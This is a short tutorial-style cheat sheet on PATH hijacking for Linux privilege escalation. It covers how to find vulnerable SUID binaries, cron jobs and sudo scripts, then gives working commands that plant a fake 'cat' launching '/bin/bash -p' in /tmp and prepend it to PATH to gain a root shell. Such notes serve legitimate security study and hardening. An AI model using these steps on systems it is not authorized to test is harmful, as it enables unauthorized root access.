# PATH Hijacking

## Table of Contents

1. [Overview](#overview)
2. [How to Identify](#how-to-identify)
3. [Exploitation](#exploitation)

---

## Overview

When a script (running as root, via SUID, or as a cron job) calls a command by name without its absolute path (e.g., `cat` instead of `/usr/bin/cat`), the shell resolves the command by searching through the directories listed in the `$PATH` variable, from left to right. By prepending a directory we control to `$PATH`, we can make the script execute our malicious binary instead of the intended one.

## How to Identify

1. Look for SUID binaries, cron jobs, or sudo-allowed scripts:

```bash
# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*/

# Sudo allowed commands
sudo -l
```

2. Inspect the script or binary for commands called without absolute paths:

```bash
# Read the script source
cat /path/to/script.sh

# For compiled binaries, check which commands they call
strings /path/to/binary | grep -v '/'
ltrace /path/to/binary
```

If you see something like `system("service apache2 restart")` or a script containing `ps`, `cat`, `curl` without `/usr/bin/...`, it is vulnerable.

## Exploitation

1. Create a malicious binary with the same name as the hijacked command:

```bash
echo '/bin/bash -p' > /tmp/cat
chmod +x /tmp/cat
```

2. Prepend your directory to `$PATH`:

```bash
export PATH=/tmp:$PATH
```

3. Run the vulnerable script/binary. It will find your version of the command first:

```bash
# If SUID binary
/path/to/vulnerable_suid_binary

# If sudo-allowed
sudo /path/to/vulnerable_script.sh
```

> **Note:** For SUID binaries, some systems drop `$PATH` modifications. In that case, check if the binary itself sets `PATH` insecurely or if you can write to a directory already in its search path.
